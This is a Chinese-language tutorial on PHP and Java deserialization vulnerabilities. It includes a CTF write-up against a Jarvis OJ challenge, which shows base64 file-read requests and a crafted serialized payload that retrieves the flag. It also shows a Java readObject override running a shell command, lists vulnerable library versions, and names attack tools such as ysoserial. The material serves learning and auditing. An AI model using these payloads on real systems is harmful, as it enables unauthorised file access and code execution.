# web漏洞-反序列化基础




## PHP 反序列化


### 什么是反序列化

序列化就是把一个对象变成可以传输的字符串。反序列化就是把那串可以传输的字符串再变回对象。

为了方便理解，这里可以通过json的序列化和反序列化来理解，如下代码：


```
<?php
$book = array('book1' => "Harry Potter", "book2" => "MR.Bean", "book3" => "Python Cookbook", "book4"=>"History");
$json = json_encode($book);
echo $json;
```

这边有一个book的数组

'book1'=>'Harry Potter',

'book2'=>'MR.Bean',

'book3'=>'Python Cookbook',

'book4'=>'History'

代码中通过`json_encode()`这个函数帮助我们将这个数组序列化成一串字符串. 序列化的结果为：

```
{"book1":"Harry Potter","book2":"MR.Rean","book3":"Python Cookbook","book4":"History"}
```

#### php中类进行序列化

先看如下代码：

```
<?php

class DemoClass
{
    public $name = "Notyeat";
    public $sex = "man";
    public $age = "18";
}

$example = new DemoClass();
$example -> name = "join";
$example -> sex = "Woman";
$example -> age = "10";

$val = serialize($example);
echo $val;
echo PHP_EOL;
$new =  unserialize($val);
echo $new -> name;
```

在php中通过`serialize()`函数就可以将一个对象进行序列化unserialize()函数可以将字符串反序列化为对象，通过上面这个代码序列化的结果为：

```
O:9:"DemoClass":3:{s:4:"name";s:4:"join";s:3:"sex";s:5:"Woman";s:3:"age";s:2:"10";}
join
```

这里对上面数据从左往右依次进行说明：
- O：代表object 还有一种情况是A,array表示数组
- 3：代表对象里面有三个变量
- s：变量数据类型，s代表string，i代表int
- s:4:"name": 这里的4表示的是变量名的字符长度

### 为什么会产生序列化漏洞

php的序列化中有几个魔术方法，这几个魔术方法都是以“_” 开头，即通过某种条件触发，不用手动调用。在php反序列话漏洞中，有如下几个魔术方法需要注意：
- `__construct()`: 当一个对象创建时被调用
- `__destruct()`: 当一个对象销毁时被调用
- `__toString()`: 当一个对象被当作一个字符串使用
-` __sleep()` : 在对象在被序列化之前运行
- `__wakeup`: 将在序列化之后立即被调用

如果服务器能够接收反序列化过的字符串、并且未经过滤的把其中的变量直接放进这些魔术方法里面的话，就容易造成很严重的漏洞了。举个例子来看更加清楚：

```
<?php
class A{
    var $test = "demo";
    function __destruct(){
            echo $this->test;
    }
}
$a = $_GET['test'];
$a_unser = unserialize($a);
?>
```

我们通过如下访问可以构造如下请求，页面就会打印hello：

```
http://127.0.0.1/?test=O:1:"A":1:{s:4:"test";s:5:"hello";}
```

### 一个ctf比赛的例子

http://web.jarvisoj.com:32768/

第一次做这种题，所以整理一下第一次的解题思路：

题目说了是通向神盾局内部的秘密入口

看页面请求中有如下请求，很明显，img参数是base64加密了，解密后的内容为：`shield.jpg`
`http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLmpwZw==`

所以想着是否可以通过`http://web.jarvisoj.com:32768/showimg.php?img=shield.php`，看是否包含这个文件，当然这里需要对 shield.php 进行加密，加密后的内容为：`c2hpZWxkLnBocA==` 访问 `http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLnBocAo=` 得到如下代码：

```
<?php
	//flag is in pctf.php
	class Shield {
		public $file;
		function __construct($filename = '') {
			$this -> file = $filename;
		}
		
		function readfile() {
			if (!empty($this->file) && stripos($this->file,'..')===FALSE  
			&& stripos($this->file,'/')===FALSE && stripos($this->file,'\\')==FALSE) {
				return @file_get_contents($this->file);
			}
		}
	}
?>

```

从这里我们知道了flag在pctf.php, 那么执行通过读这个文件内容呢？随即访问了：`http://web.jarvisoj.com:32768/showimg.php?img=cGN0Zi5waHA=`
页面提示`File not found` 果然没有想的那么简单。

那么如果直接访问`http://web.jarvisoj.com:32768/pctf.php`,结果页面提示：
`FLAG: PCTF{I_4m_not_fl4g}`

这个时候想既然已经可以看代码文件内容了那就把showimg.php的代码内容也看一下，随即访问：`http://web.jarvisoj.com:32768/showimg.php?img=c2hvd2ltZy5waHA=` 得到了内容如下：

```
<?php
	$f = $_GET['img'];
	if (!empty($f)) {
		$f = base64_decode($f);
		if (stripos($f,'..')===FALSE && stripos($f,'/')===FALSE && stripos($f,'\\')===FALSE
		&& stripos($f,'pctf')===FALSE) {
			readfile($f);
		} else {
			echo "File not found!";
		}
	}
?>
```

这里和猜想的差不多就是根据img参数去读文件，不过目前我知道的有用信息是答案就在pctf.php, 这个时候看看页面下是否有index.php 文件，看看内容是什么，访问：`http://web.jarvisoj.com:32768/showimg.php?img=aW5kZXgucGhw`,看到了如下内容



```
<?php 
	require_once('shield.php');
	$x = new Shield();
	isset($_GET['class']) && $g = $_GET['class'];
	if (!empty($g)) {
		$x = unserialize($g);
	}
	echo $x->readfile();
?>
```

看到这个基本就对怎么拿到答案了，index.php 接收一个class， 这里有序列化操作，加上上面的序列化中 __construct 这个魔术函数有相关参数，那么就构造序列化的字符串应该就可以获取flag了

`http://web.jarvisoj.com:32768/?class=O:6:"Shield":1:{s:4:"file";s:8:"pctf.php";}` 访问得到如下结果：

```
<?php 
	//Ture Flag : PCTF{W3lcome_To_Shi3ld_secret_Ar3a}
	//Fake flag:
	echo "FLAG: PCTF{I_4m_not_fl4g}"
?>
```


## jAVA反序列化

### Java反序列化概述

Java 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存或文件中，实现跨平台通讯和持久化存储。ObjectOutputStream类的 writeObject() 方法可以实现序列化。反序列化则指把字节序列恢复为 Java 对象的过程，相应的，ObjectInputStream 类的 readObject() 方法用于反序列化。

### Java的反序列化代码


```
package com.company;
import java.io.*;


public class Main {

    public static void main(String[] args)throws Exception {
        MyObject myObject=new MyObject();
        myObject.name="hello world!";
        //创建一个包含对象进行反序列化信息的”object”数据文件
        FileOutputStream fos = new FileOutputStream("object");
        ObjectOutputStream os = new ObjectOutputStream(fos);
        //writeObject()方法将obj对象写入object文件
        os.writeObject(myObject);
        os.close();
        //从文件中反序列化obj对象
        FileInputStream fis=new FileInputStream("object");
        ObjectInputStream ois=new ObjectInputStream(fis);
        //恢复对象
        MyObject obj2=(MyObject)ois.readObject();
        System.out.print(obj2.name);
        ois.close();
    }
}

class MyObject implements Serializable {
    //只有实现了Serializable接口的类的对象才可以被序列化
    public String name;
    //重写readObject()方法
    private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{
        //执行默认的readObject()方法
        in.defaultReadObject();
        //执行打开计算器程序命令
        Runtime.getRuntime().exec("ls /home/fan/hugo_blog");
    }
}

```

java类对象要实现反序列化，该类必须实现 java.io.Serializable接口，并且一般会调用readObect方法，该方法的实现容易引发漏洞。除了readObect，有时也会用到readUnshared方法，与readObect不同的是，此方法不允许后续的readObect/readUnshared调用此次反序列化得到的对象。

实战中真正出现漏洞的情况一般有以下几种：
（1）重写ObjectInputStream对象的resolveClass方法中的检测可被绕过。
（2）使用第三方的类进行黑名单控制。容易存在漏网之鱼，如果后期添加了新的功能，还可能引入了新的漏洞利用方式。
（3）使用了不安全的基础库。如下：

```
commons-fileupload 1.3.1
commons-io 2.4
commons-collections 3.1
commons-logging 1.2
commons-beanutils 1.9.2
org.slf4j:slf4j-api 1.7.21
com.mchange:mchange-commons-java 0.2.11
org.apache.commons:commons-collections 4.0
com.mchange:c3p0 0.9.5.2
org.beanshell:bsh 2.0b5
org.codehaus.groovy:groovy 2.3.9
org.springframework:spring-aop 4.1.4.RELEASE
```

### 反序列化漏洞检测流程

- 反序列化操作一般应用在导入模板文件、网络通信、数据传输、日志格式化存储或DB存储等业务场景。因此审计过程中重点关注这些功能板块。
- 找到对应的功能模块后，检索源码中对反序列化函数的调用来静态寻找反序列化的输入点，如以下函数：


```
ObjectInputStream.readObject
ObjectInputStream.readUnshared
XMLDecoder.readObject
Yaml.load
XStream.fromXML
ObjectMapper.readValue
JSON.parseObject
```
- 确定了反序列化输入点后，查看应用的Class Path中是否包含Apache Commons Collections等危险库（ysoserial所支持的其他库亦可），若不包含危险库，则查看一些涉及命令、代码执行的代码区域，防止程序员代码不严谨，导致bug。若包含危险库，则使用ysoserial进行攻击。



JSON是一种轻量级的数据交换格式，基于“键/值”对，结构可以进行嵌套。主流JSON库包含GSON、Jackson、Fastjson。

注意：Fastjson不要启用autotype，若开启autotype选用黑名单策略，依旧有绕过风险


### JAVA反序列化工具

JAVA常见的反序列化工具包含Freddy/ysoserial/marshalsec等

- ysoserial：https://github.com/frohoff/ysoserial
- Freddy：https://github.com/bignerdranch/Freddy
- marshalsec： https://github.com/mbechler/marshalsec
